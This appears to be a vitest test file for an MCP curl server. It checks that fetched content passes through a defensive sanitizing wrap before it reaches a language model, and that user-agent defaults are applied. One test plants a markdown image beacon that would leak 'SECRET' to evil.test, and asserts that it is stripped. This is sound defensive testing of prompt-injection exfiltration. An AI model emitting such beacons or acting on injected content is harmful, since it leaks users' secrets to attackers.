// src/lib/tools/register-all-tools.test.ts
// Guards the SHIPPED BINARY's registration path — `src/index.ts` →
// `runStdio()`/`runHTTP()` → `registerAllCapabilities()` → `registerAllTools`.
//
// This path had no test at all, which is why `docs/todos/006` was possible:
// every wrap assertion in the tree ran against `McpCurlServer` or
// `tool-wrapper.ts` directly, so the whole suite stayed green while the one
// entry point `curl-mcp` exposes returned unwrapped output. A correct wrap that
// a registration path never calls is indistinguishable, from a unit test's
// point of view, from no wrap at all.
//
// The subprocess is the only thing mocked. Everything above it — the real
// executor, `processResponse`, `defendText`, the post-processor wrap — runs, so
// these assert the composition rather than any one stage's contract.

import { describe, it, expect, vi, beforeEach, type Mock } from "vitest";
import { CurlExecuteSchema } from "../server/schemas.js";
import { DEFAULT_USER_AGENT } from "../config/index.js";
import { clearInjectionDetectionMap } from "../security/detection-logger.js";

// The real separator length, not a short stand-in: the metadata search window
// is sized from it, so a shorter mock hides margin the production path lacks.
const SEP = "\n---MCP-CURL-00000000-0000-4000-8000-000000000000---\n";

vi.mock("../types/index.js", async () => {
    const actual = await vi.importActual<typeof import("../types/index.js")>("../types/index.js");
    return { ...actual, generateMetadataSeparator: () => SEP };
});

vi.mock("../security/index.js", async () => {
    const actual = await vi.importActual<typeof import("../security/index.js")>("../security/index.js");
    return {
        ...actual,
        validateUrlAndResolveDns: vi.fn().mockResolvedValue({
            hostname: "api.example.test",
            resolvedIp: "93.184.216.34",
            port: 443,
        }),
        checkRateLimits: vi.fn(),
    };
});

vi.mock("../execution/index.js", async () => {
    const actual = await vi.importActual<typeof import("../execution/index.js")>("../execution/index.js");
    return { ...actual, executeCommand: vi.fn() };
});

const executionModule = await import("../execution/index.js");
const { registerAllCapabilities } = await import("../server/registration.js");

const mockedExecuteCommand = executionModule.executeCommand as Mock;

/** Build cURL output as the real executor hands it back. */
function curlOutput(body: string, contentType: string) {
    return {
        stdoutBytes: Buffer.concat([
            Buffer.from(body, "utf8"),
            Buffer.from(`${SEP}${contentType}`, "utf8"),
        ]),
        headerBytes: undefined,
        headerBytesReceived: undefined,
        stderr: "",
        exitCode: 0,
    };
}

/**
 * Register through the shipped chain and hand back the captured handlers.
 *
 * `registerAllCapabilities` rather than `registerAllTools`, because the claim
 * being guarded is about what `runStdio()` builds — and the extra hop is where
 * a future edit would most plausibly reintroduce a bare registration.
 */
function registerViaShippedPath() {
    const handlers = new Map<string, (...args: unknown[]) => Promise<unknown>>();
    const fakeServer = {
        registerTool: (
            name: string,
            _meta: unknown,
            handler: (...args: unknown[]) => Promise<unknown>
        ) => {
            handlers.set(name, handler);
        },
        registerResource: vi.fn(),
        registerPrompt: vi.fn(),
    };
    registerAllCapabilities(fakeServer as never);
    return handlers;
}

/** Parse through the real schema so tests exercise the true input shape. */
const params = (p: Record<string, unknown>) =>
    CurlExecuteSchema.parse({ url: "https://api.example.test/v1/thing", ...p });

/** Read a flag's value out of the argv the executor built. */
function flagValue(args: readonly string[], flag: string): string | undefined {
    const i = args.indexOf(flag);
    return i === -1 ? undefined : args[i + 1];
}

const textOf = (result: unknown) => (result as { content: { text: string }[] }).content[0].text;

beforeEach(() => {
    clearInjectionDetectionMap();
    vi.clearAllMocks();
});

describe("registerAllTools — the shipped binary's registration path", () => {
    it("registers both tools", () => {
        const handlers = registerViaShippedPath();
        expect([...handlers.keys()].sort()).toEqual(["curl_execute", "jq_query"]);
    });

    // ---------------------------------------------------------------------
    // Invariant 1: every byte returned to the LLM passes through the wrap.
    //
    // `application/json` is the content type that makes this falsifiable.
    // Under invariant 1a the PERSISTED copy keeps the JSON-document exemption
    // (RC-8/RC-10), so `defendText` leaves the beacon alone on the way to
    // disk. The wrap passes `excludeJsonDocuments: false`, so the RETURNED
    // copy must be stripped. Without the wrap the two copies are identical
    // and the beacon reaches the model verbatim — which is exactly what the
    // shipped binary did.
    // ---------------------------------------------------------------------
    it("strips a markdown beacon from an application/json body before returning it", async () => {
        mockedExecuteCommand.mockResolvedValue(
            curlOutput('{"note":"![x](https://evil.test/?d=SECRET)"}', "application/json")
        );

        const handlers = registerViaShippedPath();
        const text = textOf(await handlers.get("curl_execute")!(params({}), { sessionId: undefined }));

        expect(text).toContain("[image removed]");
        expect(text).not.toContain("evil.test");
        expect(text).not.toContain("SECRET");
    });

    // ---------------------------------------------------------------------
    // `README.md` documents MCP_CURL_USER_AGENT and MCP_CURL_REFERER as the
    // default "for every request". `applyDefaultHeaders` is their only reader
    // and it sits on the registration path, so before this fix the shipped
    // binary ignored both env vars entirely while the library honoured them.
    //
    // Asserted on the argv the executor actually built, not on the transform
    // in isolation: the transform was always correct: nothing called it.
    // ---------------------------------------------------------------------
    it("honours MCP_CURL_USER_AGENT on the shipped path", async () => {
        vi.stubEnv("MCP_CURL_USER_AGENT", "sixees-orchestrator/1.0");
        mockedExecuteCommand.mockResolvedValue(curlOutput("{}", "application/json"));

        const handlers = registerViaShippedPath();
        await handlers.get("curl_execute")!(params({}), { sessionId: undefined });

        const args = mockedExecuteCommand.mock.calls[0][1] as string[];
        expect(flagValue(args, "-A")).toBe("sixees-orchestrator/1.0");
        vi.unstubAllEnvs();
    });

    it("identifies itself with the default User-Agent when no env override is set", async () => {
        vi.stubEnv("MCP_CURL_USER_AGENT", undefined as unknown as string);
        mockedExecuteCommand.mockResolvedValue(curlOutput("{}", "application/json"));

        const handlers = registerViaShippedPath();
        await handlers.get("curl_execute")!(params({}), { sessionId: undefined });

        const args = mockedExecuteCommand.mock.calls[0][1] as string[];
        expect(flagValue(args, "-A")).toBe(DEFAULT_USER_AGENT);
        expect(flagValue(args, "-A")).toContain("mcp-curl/");
        vi.unstubAllEnvs();
    });

    // A caller-supplied user_agent still wins — the defaults fill a gap, they
    // do not override an explicit choice.
    it("does not override an explicit user_agent", async () => {
        vi.stubEnv("MCP_CURL_USER_AGENT", "sixees-orchestrator/1.0");
        mockedExecuteCommand.mockResolvedValue(curlOutput("{}", "application/json"));

        const handlers = registerViaShippedPath();
        await handlers.get("curl_execute")!(
            params({ user_agent: "explicit/9.9" }),
            { sessionId: undefined }
        );

        const args = mockedExecuteCommand.mock.calls[0][1] as string[];
        expect(flagValue(args, "-A")).toBe("explicit/9.9");
        vi.unstubAllEnvs();
    });
});
